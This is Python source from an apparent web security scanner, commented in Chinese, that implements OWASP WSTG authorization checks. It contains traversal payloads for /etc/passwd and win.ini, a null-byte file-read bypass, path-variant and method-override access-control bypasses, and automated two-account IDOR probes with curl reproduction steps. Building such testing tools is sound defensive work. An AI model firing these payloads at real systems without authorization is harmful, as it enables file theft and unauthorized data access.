# -*- coding: utf-8 -*-
"""
WSTG-ATHZ 授权（5 项）
======================
授权类漏洞有两个层次：

  ① 匿名视角可判定：目录遍历 / 文件包含、路径混淆之外的强制浏览、
     未授权即可访问的用户资源（IDOR 的未认证分支）、OAuth 回调校验缺失；
  ② 必须多账号交叉比对：水平越权、垂直越权、跨租户越权。

本模块实现 ①，并把 ② 明确标注为「待人工执行」并给出矩阵化操作步骤。
把 ② 伪装成自动化结论，是渗透报告里最常见的失实来源。
"""

from __future__ import annotations

import json
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

from engine.checks.base import (
    extract_object_refs, extract_params, finding_evidence, is_real_hit, js_api_paths,
    ok, found, probe_or_none, scan_paths, no_target_outcome,
)
from engine.registry import (
    RISK_DEEP, RISK_SAFE, RISK_STANDARD, DetectorContext, make_auto, make_finding,
    make_manual,
)
from engine import recon_identity as recon_id

# 可能参与文件路径拼接的参数名
FILE_PARAMS = re.compile(
    r"^(file|filename|path|filepath|url|uri|src|source|dest|destination|target|"
    r"page|template|tpl|include|inc|doc|document|download|dir|folder|load|read|"
    r"view|img|image|attachment|resource|content|conf|config)$", re.I)

# 目录遍历载荷（只读语义）
TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "....\\....\\....\\windows\\win.ini",
]

UNIX_MARKERS = [r"root:[x*]:0:0:", r"root:/root:", r"daemon:/usr/sbin", r"/bin/bash$", r"/bin/sh$"]
WIN_MARKERS = [r"\[fonts\]", r"\[extensions\]", r"for 16-bit app support", r"\[mci extensions\]"]


# ======================================================================
# WSTG-ATHZ-01 目录遍历与文件包含
# ======================================================================
@make_auto("WSTG-ATHZ-01", name="目录遍历与任意文件读取检测", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="文件读取实测",
           detector_ref="checks/authz.py:athz01")
def athz01(ctx: DetectorContext):
    findings = []
    params = extract_params(ctx)
    targets = [p for p in params if FILE_PARAMS.match(p.get("param", ""))]
    # 若没找到明显的文件参数，退一步用全部参数的前若干个试（保守取值）
    if not targets:
        targets = params[:6]

    probes = 0
    for t in targets[:6]:
        base_url, pname = t["url"], t["param"]
        parsed = urlparse(base_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for payload in TRAVERSAL_PAYLOADS:
            probes += 1
            qs[pname] = [payload]
            test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
            try:
                pr = ctx.get(test_url)
            except Exception:  # noqa: BLE001
                continue
            body = getattr(pr, "body_snippet", "") or ""
            if not body:
                continue
            for mk in UNIX_MARKERS:
                if re.search(mk, body):
                    findings.append(make_finding(
                        "WSTG-ATHZ-01",
                        f"目录遍历可读取系统文件（参数 {pname}）",
                        ctx.target_name, endpoint=base_url, method="GET", param=pname,
                        severity="严重", confidence="High", evidence_level="A",
                        description=(f"参数 `{pname}` 的值被直接拼进服务端文件路径，未做任何过滤。"
                                     "构造包含 ../ 的路径后，服务器返回了系统文件内容，"
                                     "说明可以读取服务器上任意文件。"),
                        technical_detail=(f"受影响参数：{pname}\n"
                                          f"载荷类型：路径遍历（含编码绕过变体）\n"
                                          f"命中特征：{mk}\n"
                                          f"响应片段（已截断）：\n{body[:900]}"),
                        impact=("可读取服务器任意可读文件。实际攻击链通常是："
                                "读 /etc/passwd 确认权限 → 读应用配置文件拿到数据库口令 → "
                                "读源码拿到更多接口与逻辑 → 直接连库取数。"
                                "这条路径可以直接走到「拿到数据」和「拿到权限」，属最高危害等级。"),
                        reproduction=(f"原始请求：GET {base_url}\n"
                                      f"改为：{pname}=../../../../etc/passwd（或使用 ../ 的编码变体）\n"
                                      "响应中出现 root:x:0:0 即确认。"),
                        remediation=("① 不使用用户输入拼接文件路径，改由服务端白名单映射"
                                     "（如将 id 映射到固定文件）；"
                                     "② 必须用文件名时：先规范化路径，再校验结果是否位于允许目录内"
                                     "（realpath 后做前缀比对）；"
                                     "③ 过滤 ..、绝对路径、以及各类编码变体；"
                                     "④ 应用进程以最小权限运行，限制可读目录范围。"),
                        compliance="等保2.0 安全计算环境-数据保密性 / CWE-22",
                        evidence=[finding_evidence("response", body[:1500],
                                                   f"遍历载荷命中 {mk}")],
                        grading_basis="实测读取到系统文件内容，可直接延伸至配置与数据获取，定严重",
                    ))
                    break
            if findings:
                break
        if findings:
            break

    # ---- 空字节双重编码文件读取绕过（Poison Null Byte）----
    # 只读 GET，零副作用。Juice Shop 等把受限文件放在 /ftp 下、只允许 .md/.pdf 直接访问；
    # 但 /ftp/<file>%2500.md 经两次解码变成 <file>\x00.md —— 扩展名校验看到的是 .md（放行），
    # 文件读取在空字节处截断，实际读到 <file>，从而读出本应被拒的文件。
    # 属「任意文件读取」的一种具体形态，归口 WSTG-ATHZ-01（目录遍历与任意文件读取）。
    # 仅在遍历未命中时才用空字节兜底，避免与「严重」遍历发现重复计项。
    nb_hit = False
    if not findings:
        for _fb, _fd in (
            ("/ftp/package.json.bak%2500.md", "/ftp/package.json.bak"),
            ("/ftp/package.json%2500.md", "/ftp/package.json"),
        ):
            fb = urljoin(ctx.target_url, _fb)
            fd = urljoin(ctx.target_url, _fd)
            try:
                rb = ctx.get(fb)
                rd = ctx.get(fd)
            except Exception:  # noqa: BLE001
                continue
            probes += 2
            body_b = (getattr(rb, "body_snippet", "") or "")
            body_d = (getattr(rd, "body_snippet", "") or "")
            st_b = getattr(rb, "status", 0)
            st_d = getattr(rd, "status", 0)
            denied = st_d in (403, 404) or "Only .md and .pdf" in body_d
            exposed = st_b == 200 and (
                '"name": "juice-shop"' in body_b
                or '"dependencies"' in body_b
                or body_b.strip().startswith("{"))
            if denied and exposed:
                findings.append(make_finding(
                    "WSTG-ATHZ-01",
                    "空字节双重编码绕过文件类型白名单读取受限文件（Poison Null Byte）",
                    ctx.target_name, endpoint=fb, method="GET", param="ftp 文件路径",
                    severity="中危", confidence="High", evidence_level="A",
                    description=("目标 /ftp 目录只允许访问 .md / .pdf 文件，"
                                 "package.json 等敏感清单被白名单挡住；但用双重编码 %2500"
                                 "（先解码成 %00 再成空字节）构造路径，扩展名校验看到的是 .md"
                                 "（放行），实际文件读取在空字节处截断，落到 package.json.bak，"
                                 "从而读出了本应被拒的依赖清单。"),
                    technical_detail=(
                        f"拒绝地址：{fd} → HTTP {st_d}（白名单拦截：Only .md and .pdf）\n"
                        f"绕过地址：{fb} → HTTP {st_b}\n"
                        f"绕过响应含依赖清单标记："
                        f"{'是' if exposed else '否'}"
                        f"（命中 '\"name\": \"juice-shop\"' 或 '\"dependencies\"'）"),
                    impact=("文件类型 / 路径白名单可被构造绕过，攻击者能用同样手法读出"
                            "任何被「仅允许某扩展名」保护的文件（含配置文件、备份、源码），"
                            "是目录遍历 / 任意文件读取类危害的前置。"),
                    reproduction=(
                        f"curl -s '{fd}'   # 先确认被拒\n"
                        f"curl -s '{fb}' | head -c 300   # 确认绕过地址回显依赖清单"),
                    remediation=("① 取文件名前先剥离 %00 等截断字符并归一化；"
                                 "② 扩展名校验基于「解码后、截断后的真实文件名」全等比对，"
                                 "而非原始请求串；③ 受限目录禁止按客户端给定路径读取。"),
                    compliance="等保2.0 安全计算环境-数据保密性 / CWE-626",
                    evidence=[finding_evidence(
                        "response_body",
                        f"GET {fb} → HTTP {st_b}，响应含 juice-shop 依赖清单",
                        "空字节绕过读出的受限文件")],
                    grading_basis="匿名只读实测：受限文件被拒、绕过地址回显依赖清单，定中危",
                ))
                nb_hit = True
                break

    if not targets and not findings:
        return no_target_outcome(ctx, "带参数的接口端点", probes=probes, evidence_kind="无候选参数")

    note = (f"候选文件参数 {len(targets)} 个，测试遍历载荷 {probes} 次，"
            f"{'命中目录遍历' if any('目录遍历' in (getattr(f, 'title', '') or '') for f in findings) else '遍历未命中'}")
    if nb_hit:
        note += "；空字节双重编码文件读取绕过命中（Poison Null Byte）"
    return found(note, findings, probes=probes, evidence_kind="文件读取实测")


# ======================================================================
# WSTG-ATHZ-02 绕过授权方案
# ======================================================================
@make_auto("WSTG-ATHZ-02", name="授权强制浏览与方法覆盖绕过", tool="内置检测器",
           risk=RISK_STANDARD, evidence_kind="授权绕过实测",
           detector_ref="checks/authz.py:athz02")
def athz02(ctx: DetectorContext):
    findings = []
    probes = 0

    # 1) 强制浏览：对受控路径的常见变体直接访问
    protected = [p for p, pr in (ctx.fp_result.get("path_probes") or {}).items()
                 if isinstance(pr, dict) and pr.get("status") in (401, 403)]
    probes += len(protected)
    if protected:
        base = protected[0].strip("/")
        variants = [f"{base}/..;/", f"{base}%2e/", f"{base}/.", f"api/{base}",
                    f"{base}.json", f"{base}?format=json", f"{base}/index",
                    f"{base}/../{base}"]
        res = ctx.probe_many(variants)
        probes += len(variants)
        for v, pr in res.items():
            if is_real_hit(ctx, pr, min_len=30):
                findings.append(make_finding(
                    "WSTG-ATHZ-02", f"授权可被路径变体绕过：/{v}",
                    ctx.target_name, endpoint=urljoin(ctx.target_url, v),
                    severity="高危", confidence="High", evidence_level="A",
                    description=(f"`/{base}` 直接访问被拒绝，但用路径变体 `/{v}` 可以正常访问。"
                                 "访问控制按字符串前缀匹配，没有对路径做归一化，"
                                 "导致受保护资源可以被变形绕开。"),
                    technical_detail=(f"受保护路径：/{base}（HTTP "
                                      f"{(ctx.fp_result.get('path_probes') or {}).get(base, {}).get('status')}）\n"
                                      f"绕过路径：/{v}（HTTP {getattr(pr, 'status', 0)}）"),
                    impact=("可直接访问本应受限的功能与数据，且无需任何凭据。"
                            "若绕过目标为管理接口或数据查询接口，等同于权限体系失效。"),
                    reproduction=(f"curl -sI {urljoin(ctx.target_url, base)}   # 被拒绝\n"
                                  f"curl -s  {urljoin(ctx.target_url, v)} | head -20  # 可访问"),
                    remediation=("访问控制在服务端框架的拦截器层实现（按路由匹配），"
                                 "不依赖 Nginx location 字符串匹配；"
                                 "进入鉴权前先做路径归一化（解码、去除 ..、; / 多余分隔符）。"),
                    compliance="等保2.0 安全计算环境-访问控制 / CWE-647",
                    evidence=[finding_evidence("response",
                                               (getattr(pr, "body_snippet", "") or "")[:800],
                                               f"绕过路径 {v}")],
                    grading_basis="实测绕过访问控制可达受保护资源，定高危",
                ))
                break

    # 2) HTTP 方法覆盖
    api_like = ctx._cache.get("info06_api_like") or []
    if api_like:
        probes += 1
        url = api_like[0] if str(api_like[0]).startswith("http") \
            else urljoin(ctx.target_url, str(api_like[0]).lstrip("/"))
        base_pr = ctx.get(url)
        base_status = getattr(base_pr, "status", 0)
        if base_status in (401, 403):
            import requests
            for hdr, val in (("X-HTTP-Method-Override", "GET"),
                             ("X-HTTP-Method", "GET"),
                             ("X-Method-Override", "GET")):
                probes += 1
                try:
                    ctx._client._throttle()
                    r = requests.get(url, timeout=ctx._client.timeout, verify=False,
                                     headers={**dict(ctx._client.session.headers), hdr: val})
                    if r.status_code == 200 and len(r.text or "") > 100:
                        findings.append(make_finding(
                            "WSTG-ATHZ-02", f"授权可被方法覆盖头绕过（{hdr}）",
                            ctx.target_name, endpoint=url, method="GET", param=hdr,
                            severity="高危", confidence="High", evidence_level="A",
                            description=(f"接口正常访问返回 HTTP {base_status}，"
                                         f"但带上 `{hdr}: {val}` 后返回 200。"
                                         "某些框架 / 网关会信任该头并据此重新路由，"
                                         "从而绕过针对原始方法的鉴权规则。"),
                            technical_detail=f"基准：HTTP {base_status}\n加上 {hdr}: {val} → HTTP 200\n"
                                             f"响应片段：{(r.text or '')[:400]}",
                            impact="可绕过针对特定 HTTP 方法的鉴权规则，直接调用受保护接口。",
                            reproduction=f"curl -s -H '{hdr}: {val}' {url} | head -20",
                            remediation="网关与应用层忽略客户端传入的方法覆盖头，或在入口统一剥离。",
                            compliance="等保2.0 安全计算环境-访问控制 / CWE-650",
                            evidence=[finding_evidence("response", (r.text or "")[:800],
                                                       f"{hdr} 绕过")],
                            grading_basis="实测绕过鉴权返回正常业务响应，定高危",
                        ))
                        break
                except Exception:  # noqa: BLE001
                    continue

    note = (f"受控路径 {len(protected)} 个，路径变体绕过 {'命中' if findings else '未命中'}；"
            f"方法覆盖头测试 {'命中' if len(findings) > 1 else '未命中'}")
    return found(note, findings, probes=probes, evidence_kind="授权绕过实测")


# ======================================================================
# WSTG-ATHZ-03 权限提升
# ======================================================================
@make_manual(
    "WSTG-ATHZ-03", name="垂直 / 水平权限提升矩阵测试",
    procedure=("⚠️ 需要 2 组以上真实测试账号，凭据通过环境变量注入，不写入任何文件。\n"
               "【垂直越权】\n"
               "1) 用「普通用户」账号 A 登录，抓取所有请求；\n"
               "2) 遍历管理员专属接口（用户管理、角色配置、数据导出、系统设置），"
               "用 A 的身份逐个调用，观察是否返回数据或成功执行；\n"
               "3) 重点检查：只在前端隐藏了菜单、接口未做角色校验的情况；\n"
               "4) 尝试自我提权：调用「修改自己角色」的接口，把角色字段改为管理员。\n"
               "【水平越权】\n"
               "5) 用账号 A 获取自己的资源 ID（订单号 / 工单号 / 用户 ID / 文件 ID）；\n"
               "6) 用账号 B 的身份请求 A 的资源 ID，观察是否可读取；\n"
               "7) 对 ID 做 ±1 遍历与 UUID 变换，确认是否存在遍历取数可能。\n"
               "【跨租户】（多租户 / 多组织架构时必做）\n"
               "8) 取另一租户的资源标识，用本租户账号请求，确认是否隔离。\n"
               "【记录要求】每个用例必须留下：请求、响应、判定结论，作为报告证据。"),
    expect="每个接口都做服务端角色与数据归属校验；越权请求返回 403 而非数据；"
           "前端隐藏菜单不作为安全措施。",
    why_manual=("必须有多个不同权限的真实账号才能交叉比对。"
                "匿名扫描永远无法发现这类问题——这也正是它们成为最危险漏洞的原因。"),
    requires=["accounts"], risk=RISK_DEEP, tool="人工核查（多账号矩阵）",
    # 垂直越权（低权身份访问管理端点）可由「匿名被挡 + 低权 2xx」两条客观事实
    # 自动确证，因此挂自动前置侦察；水平越权与跨租户仍需人工。
    recon=recon_id.recon_athz03,
)
def _athz03(ctx: DetectorContext):  # pragma: no cover
    return ok("")


# ======================================================================
# 登录态下的双账号对象交叉访问（IDOR 的**主战场**）
# ======================================================================
#
# 匿名分支只能发现「不登录也能读」的那一部分，而真实系统里绝大多数
# 对象读取要求登录 —— 漏洞恰恰出在「登录了，但没校验这个对象是不是你的」。
# 这一片过去全部挂人工，于是靶场上 View Basket / Manipulate Basket /
# Payback Time / Expired Coupon 这一整片永远检不出来。
#
# 红队的标准动作是：注册两个账号 → A 建一个对象 → 用 B 去读/改它。
# 这一步**可以做自动化**，而且判据是纯客观的（不需要理解业务语义）：
#
#   ① A 用自己的身份新建一个对象，拿到它的 id；
#   ② B 用 B 自己的身份去读这个 id；
#   ③ **对照实验**：匿名去读同一个 id。
#
# 只有「B 读得到、匿名读不到」才能断成归属校验缺失 ——
# 两者都读得到那是「未授权访问」（另一条发现，不是这一条）。
# 少了对照，报出来的结论无法区分这两种完全不同的问题（红线 9）。
#: 优先档：最常见、也最容易被遍历的业务对象。
_CROSS_PREFER0 = re.compile(
    r"(?i)(basket|cart|order|address|card|wishlist|favorite|invoice|"
    r"ticket|document|file|note|album|memory)")
#: 次优先档：反馈 / 评价 / 投诉类。排在后面是因为这类接口**常常带验证码**
#: （评论要过人机校验），拿它做「新建」探针会白吃写预算 ——
#: 实测 Juice Shop 的 `/api/Feedbacks` 就是 POST 一律 500。
_CROSS_PREFER1 = re.compile(r"(?i)(complain|feedback|review|message|post|comment)")
#: 一眼不是「可新建的对象集合」：动作型端点（新建它毫无意义，
#: 还会白吃一次写预算）、认证相关、以及明显是开关/流程的地址。
_CROSS_SKIP = re.compile(
    r"(?i)(login|logout|auth|token|captcha|challenge|2fa|password|"
    r"continue-code|country-mapping|whoami|change-password|reset-password|"
    r"checkout|apply|status|verify|setup|disable|enable|balance|search|"
    r"history|admin|deluxe-membership|repeat-notification|saveLoginIp)")
_CROSS_DROP_KEYS = ("id", "createdAt", "updatedAt", "deletedAt")


def _cross_object_candidates(ctx: DetectorContext, *, limit: int = 4) -> list[str]:
    """挑「像可新建的业务对象集合」的接口地址（去重、按语义强度排序）。"""
    cands: list[tuple[int, int, str]] = []
    for i, u in enumerate(js_api_paths(ctx)):
        low = u.rstrip("/")
        last = low.rsplit("/", 1)[-1]
        if not last or last.isdigit():
            continue                       # 只要集合地址，不要对象地址
        if last.islower() and "_" not in last and len(last) < 3:
            continue
        if _CROSS_SKIP.search(low):
            continue
        _tier = (0 if _CROSS_PREFER0.search(low)
                 else 1 if _CROSS_PREFER1.search(low) else 2)
        cands.append((_tier, i, low))
    cands.sort(key=lambda x: (x[0], x[1]))
    return [u for _s, _i, u in cands[:limit]]


def _obj_of(body: str) -> dict | None:
    try:
        d = json.loads(body or "")
    except Exception:  # noqa: BLE001
        return None
    if isinstance(d, dict) and "data" in d:
        d = d.get("data")
    if isinstance(d, list):
        d = d[0] if d and isinstance(d[0], dict) else None
    return d if isinstance(d, dict) else None


# 对象响应里能揭示「这条记录属于谁」的字段（结构化匹配，不用裸数字）。
_OWNER_KEYS = ("UserId", "userId", "user_id", "owner", "ownerId", "owner_id",
               "customerId", "customer_id", "accountId", "account_id",
               "username", "email", "login")


def _parse_owner(body: str) -> str | None:
    """从对象响应里解析归属字段（谁的数据）。取不到返回 None。"""
    try:
        d = json.loads(body or "")
    except Exception:  # noqa: BLE001
        return None
    obj = d.get("data") if isinstance(d, dict) and "data" in d else d
    if isinstance(obj, list):
        obj = obj[0] if obj else None
    if not isinstance(obj, dict):
        return None
    for k in _OWNER_KEYS:
        v = obj.get(k)
        if v not in (None, "", "null", "None"):
            return str(v)
    return None


def _recon_cross_object_read(ctx: DetectorContext, accounts: list[dict],
                             tried: list[str]) -> tuple[list, int]:
    """A 建对象 → B 读它 → 匿名读它（对照）。返回 (findings, probes)。

    任何一步拿不到就换下一个候选 —— 拿不到不是「没有越权」，
    而是「本候选没测成」，必须如实记进 `tried`。
    """
    findings: list = []
    probes = 0
    if len(accounts) < 2:
        # 一个人跟自己比对不出归属 —— 硬报就是编造（红线 1 / 9）。
        # 这条**不靠调用方保证**：自测要能独立钉住它，归档回放路径也会走到这里
        # （红线 68），任何一条调用路径都得守同一个下限。
        tried.append(f"账号不足 2 组（实际 {len(accounts)} 组）→ 未执行交叉读")
        return findings, probes
    a_id, b_id = accounts[0], accounts[1]
    ia, ib = recon_id._ident_of(a_id), recon_id._ident_of(b_id)

    for coll in _cross_object_candidates(ctx):
        # ① 读一个已有对象，用它当**模板**（字段名从目标自己那儿来，不猜）
        r0 = recon_id._ident_fetch(coll + "/1", ia, ctx=ctx)
        probes += 1
        sample = _obj_of(str(r0.get("body") or ""))
        if not sample:
            tried.append(f"{coll}→读不到对象结构({r0.get('status')})")
            continue
        payload = {k: v for k, v in sample.items()
                   if k not in _CROSS_DROP_KEYS}
        if not payload:
            tried.append(f"{coll}→对象无可用字段")
            continue
        # ② A 新建一个自己的对象（受控写，两把锁：deep 档 + 台账授权）
        try:
            wr = ctx.data_submit(coll, payload, method="POST", as_json=True,
                                 account=a_id, budget_key="athz04_cross_read",
                                 max_total=4)
        except PermissionError as e:
            tried.append(f"{coll}→受控写未放行：{str(e)[:80]}")
            break
        except Exception as e:  # noqa: BLE001
            tried.append(f"{coll}→新建异常 {type(e).__name__}")
            continue
        probes += 1
        st_w = int(wr.get("status") or 0)
        if st_w not in (200, 201):
            tried.append(f"{coll}[POST]→{st_w}")
            continue
        nid = ""
        try:
            nb = json.loads(str(wr.get("body") or ""))
            nd = nb.get("data") if isinstance(nb, dict) and "data" in nb else nb
            nid = str((nd or {}).get("id") or "")
        except Exception:  # noqa: BLE001
            nid = ""
        if not nid:
            tried.append(f"{coll}[POST {st_w}]→取不到新对象标识")
            continue
        obj_url = f"{coll}/{nid}"

        # ③ B 读它（这是主判据）
        rb = recon_id._ident_fetch(obj_url, ib, ctx=ctx)
        probes += 1
        sb = int(rb.get("status") or 0)
        bb = str(rb.get("body") or "")
        # ④ 对照：匿名读同一个地址
        ra = recon_id._ident_fetch(obj_url, None, ctx=ctx)
        probes += 1
        sa = int(ra.get("status") or 0)

        # ⑤ 清理（无论结论如何都要删 —— 这是 A 账号下的真实数据）
        try:
            ctx.data_submit(obj_url, {}, method="DELETE", as_json=True,
                            account=a_id, budget_key="athz04_cross_read",
                            max_total=4)
            probes += 1
        except Exception:  # noqa: BLE001
            tried.append(f"{coll}→清理未执行（需人工删除 {obj_url}）")

        if sb not in (200, 201) or nid not in bb:
            tried.append(f"{obj_url}[B 读]→{sb}")
            continue
        if sa in (200, 201):
            # 匿名也读得到 —— 那是「未授权访问」，不是「归属校验缺失」，
            # 两条结论不能混着报（混了会让修复方向跑偏）。
            tried.append(f"{obj_url}[匿名对照]→{sa}（未授权访问，非本条）")
            continue
        findings.append(make_finding(
            "WSTG-ATHZ-04", "登录态对象归属校验缺失：B 账号可读取 A 账号的对象",
            ctx.target_name, endpoint=obj_url, method="GET", param=nid,
            severity="高危", confidence="High", evidence_level="A",
            description=(f"用账号 A 的身份新建了一个业务对象（id={nid}），"
                         f"随后用**另一个账号 B** 的身份读取 `{obj_url}`："
                         f"返回 {sb} 与完整对象内容；而同一地址在**不带任何凭据**时"
                         f"返回 {sa}。说明服务端校验了「有没有登录」，"
                         "却没有校验「这个对象是不是你的」。"),
            technical_detail=(f"对象地址：{obj_url}\n"
                              f"账号 A 新建：POST {coll} → {st_w}\n"
                              f"账号 B 读取：GET {obj_url} → {sb}（拿到完整对象）\n"
                              f"匿名对照：GET {obj_url} → {sa}（被挡，因此不是公开资源）\n"
                              f"响应片段：{bb[:300]}\n"
                              f"副作用处置：已尝试用账号 A 删除该对象"),
            impact=("任何登录用户只要改一个数字标识，就能读取其他用户的业务对象，"
                    "造成个人信息与业务数据的批量泄露（标识连续时可脚本遍历全量）。"
                    "购物车、收货地址、订单、发票这类对象一旦可读，"
                    "等同于把客户清单直接交出去。"),
            reproduction=(f"# 1) 用账号 A 登录并新建：\n"
                          f"curl -s -X POST '{coll}' -H 'Authorization: Bearer <A>' "
                          f"-H 'Content-Type: application/json' -d '{json.dumps(payload)[:200]}'\n"
                          f"# 2) 用账号 B 的身份读取上一步返回的 id：\n"
                          f"curl -s '{obj_url}' -H 'Authorization: Bearer <B>'\n"
                          f"# 3) 对照：不带任何凭据再读一次，应当被挡"),
            remediation=("① 每个对象读取都在服务端校验归属（当前用户 == 资源所有者），"
                         "不能只校验「是否登录」；"
                         "② 对象标识改用不可枚举的 UUID 只是缓解，不能替代归属校验；"
                         "③ 集合查询默认带上归属过滤条件，避免一处遗漏全站失守。"),
            compliance="等保2.0 安全计算环境-访问控制 / OWASP ASVS 4.2 / CWE-639",
            evidence=[finding_evidence("response", bb[:400], f"B 账号读取 {obj_url}")],
            grading_basis="双账号交叉实测 + 匿名对照，归属校验缺失确证，A 级定高危",
        ))
        break
    return findings, probes


# ----------------------------------------------------------------------
# 预存在的「按 id 寻址的对象」交叉读（Model 2）
# ----------------------------------------------------------------------
# 真实 BOLA（如 Juice Shop 的 View Basket）往往不是「A 建、B 读」，
# 而是「对象早就按 userId/basketId 存在，任何登录用户拿 id 就能读到
# 别人的对象」。create-then-read 模型在这种目标上永远建不出对象
# （POST 受所有权校验拒绝，例如 Juice Shop 的 `POST /api/BasketItems`
# 对不属于自己的 basketId 直接 401），于是整片漏报。
#
# 本模型直接读**已存在**的对象 id，用归属字段（UserId/owner…）做对照：
#   ① A 读 /obj/{id} → 解析归属 oa
#   ② B 读 /obj/{id} → 解析归属 ob
#   ③ 若 oa == ob（两个不同账号拿到**同一个归属**的对象）且归属字段存在
#      → 端点按 id 返回对象而不按请求者隔离，归属校验缺失；
#   ④ 匿名读同地址被挡（非公开共享资源）才坐实。
# 反向一律不报：oa != ob（各自拿到自己的，或 B 拿到 404）说明隔离生效。
_KEYPATH_WELLKNOWN = ("/rest/basket", "/api/Addresss", "/api/Cards",
                      "/api/BasketItems", "/api/Orders", "/api/PaymentMethods",
                      "/api/Users", "/rest/track-order")


def _keypath_endpoints(ctx: DetectorContext, *, limit: int = 10) -> list[str]:
    """预存在对象端点的集合基址（去重、限长）。"""
    eps: set[str] = set()
    for c in _cross_object_candidates(ctx, limit=6):
        eps.add(c)
    pat = re.compile(r"/(\d{1,9})(?:/|$|\?)")
    srcs = list(ctx.js_result.get("urls") or []) + list(
        ctx.fp_result.get("path_probes") or {})
    for u in srcs:
        if not isinstance(u, str):
            continue
        m = pat.search(u)
        if not m:
            continue
        base = (u[:m.start(1)] + u[m.end(1):]).rstrip("/")
        if base and not base.split("/")[-1].isdigit():
            eps.add(base)
    for e in _KEYPATH_WELLKNOWN:
        eps.add(e)
    return list(eps)[:limit]


def _recon_cross_object_read_keypath(ctx: DetectorContext, accounts: list[dict],
                                    tried: list[str]) -> tuple[list, int]:
    """Model 2：两账号读同一已存在对象 id，比对归属字段。"""
    findings: list = []
    probes = 0
    a_id, b_id = accounts[0], accounts[1]
    ia, ib = recon_id._ident_of(a_id), recon_id._ident_of(b_id)
    _base = str(ctx.target_url or "").rstrip("/")
    for ep in _keypath_endpoints(ctx):
        # 端点可能是相对路径（_KEYPATH_WELLKNOWN）也可能是绝对地址
        # （来自 js_api_paths）；_fetch 直接 requests.get，相对地址会抛
        # MissingSchema，必须先并到 target_url 上（红线 52：证据要落到
        # 消费方能真正发得出去的地址）。
        ep_abs = ep if ep.startswith(("http://", "https://")) else _base + "/" + ep.lstrip("/")
        hit = False
        for oid in (1, 2, 3):
            url = f"{ep_abs}/{oid}"
            ra = recon_id._ident_fetch(url, ia, ctx=ctx)
            probes += 1
            rb = recon_id._ident_fetch(url, ib, ctx=ctx)
            probes += 1
            oa = _parse_owner(str(ra.get("body") or ""))
            ob = _parse_owner(str(rb.get("body") or ""))
            if not oa or not ob:
                continue                      # 对象不存在 / 无归属字段
            if oa != ob:
                continue                      # 各自拿到自己的对象 → 隔离生效
            # 两个不同账号都拿到了归属为 oa 的同一对象
            ran = recon_id._ident_fetch(url, None, ctx=ctx)
            probes += 1
            san = int(ran.get("status") or 0)
            oanon = _parse_owner(str(ran.get("body") or ""))
            if san in (200, 201) and oanon == oa:
                tried.append(f"{url}→匿名也能读到同归属({oa})（疑似共享资源，非本条）")
                continue
            bb = str(rb.get("body") or "")
            findings.append(make_finding(
                "WSTG-ATHZ-04",
                "对象按标识寻址但缺归属校验：登录态账号可读到他人对象",
                ctx.target_name, endpoint=url, method="GET", param=str(oid),
                severity="高危", confidence="High", evidence_level="A",
                description=(
                    f"用**两个不同登录账号**分别读取 `{url}`：账号 A 与账号 B "
                    f"都拿到了归属字段为 `{oa}` 的同一对象，而匿名（无凭据）读取"
                    f"同一地址被拦截（HTTP {san}）。说明端点按对象标识返回数据，"
                    f"却没有校验「读取者是不是这个对象的主人」—— 任何登录用户"
                    f"改一下标识就能读到 `{oa}` 名下的业务对象。"),
                technical_detail=(
                    f"对照实验（同一对象地址两次身份请求 + 匿名对照）：\n"
                    f"  账号 A 读 {url} → 归属字段={oa}\n"
                    f"  账号 B 读 {url} → 归属字段={ob}（与 A 一致，同一对象）\n"
                    f"  匿名读 {url} → HTTP {san}（被挡，非公开资源）\n"
                    f"响应片段（B）：{bb[:300]}"),
                impact=("购物车、订单、地址、支付卡等对象一旦可被任意登录用户按标识读取，"
                        "等同于把客户数据整库交出去；标识连续时脚本可批量遍历全量用户。"),
                reproduction=(
                    f"# 用账号 A 的令牌\ncurl -s '{url}' -H 'Authorization: Bearer <A>'\n"
                    f"# 换成账号 B 的令牌读**同一个地址**\n"
                    f"curl -s '{url}' -H 'Authorization: Bearer <B>'\n"
                    f"# 匿名应被挡\ncurl -s '{url}'"),
                remediation=(
                    "① 每个对象读取都在服务端校验归属（当前用户 == 资源所有者），"
                    "不能只校验「是否登录」；"
                    "② 对象标识改用不可枚举的 UUID 只是缓解，不能替代归属校验；"
                    "③ 统一走同一归属校验组件，避免逐接口漏做。"),
                compliance="OWASP ASVS 4.2 / CWE-639 / 等保2.0 安全计算环境-访问控制",
                evidence=[finding_evidence(
                    "response", bb[:400], f"B 账号读取 {url}（归属 {oa}）")],
                grading_basis="双账号同地址读归属一致 + 匿名对照被挡，归属校验缺失确证，A 级定高危",
            ))
            hit = True
            break
        if hit:
            break
        tried.append(f"{ep}/* → 未确证预存在对象越权（已试 id 1..3）")
    return findings, probes


# ======================================================================
# WSTG-ATHZ-04 不安全的直接对象引用（IDOR）
# ======================================================================
@make_auto("WSTG-ATHZ-04", name="未授权对象访问检测（IDOR 匿名分支）",
           tool="内置检测器", risk=RISK_STANDARD, evidence_kind="对象访问实测",
           detector_ref="checks/authz.py:athz04")
def athz04(ctx: DetectorContext):
    findings = []
    probes = 0

    # 对象标识的来源要全：RESTful 路径段（/orders/123、/user/<uuid>）、
    # 资产测绘探到的路径、带 id 语义的查询参数。
    # 只看 ?id= 会整体漏掉 RESTful 风格的对象 —— 而那正是 IDOR 的主战场。
    candidates: list[str] = [r["url"] for r in extract_object_refs(ctx)]
    for p in (ctx.fp_result.get("path_probes") or {}):
        if re.search(r"\d{2,}", p):
            candidates.append(p)
    for u in (ctx.js_result.get("urls") or [])[:200]:
        if isinstance(u, str) and re.search(r"/\d{2,}(/|$|\?)", u):
            candidates.append(u)
    for item in (ctx._cache.get("info06_params") or []):
        if re.search(r"(id|uid|userid|orderid|no|code)", item.get("param", ""), re.I):
            candidates.append(item["url"])
    candidates = [c for c in dict.fromkeys(candidates)][:20]

    if not candidates:
        return no_target_outcome(ctx, "带对象标识（数字 / UUID）的接口", probes=2, evidence_kind="无候选端点")

    exposed = []
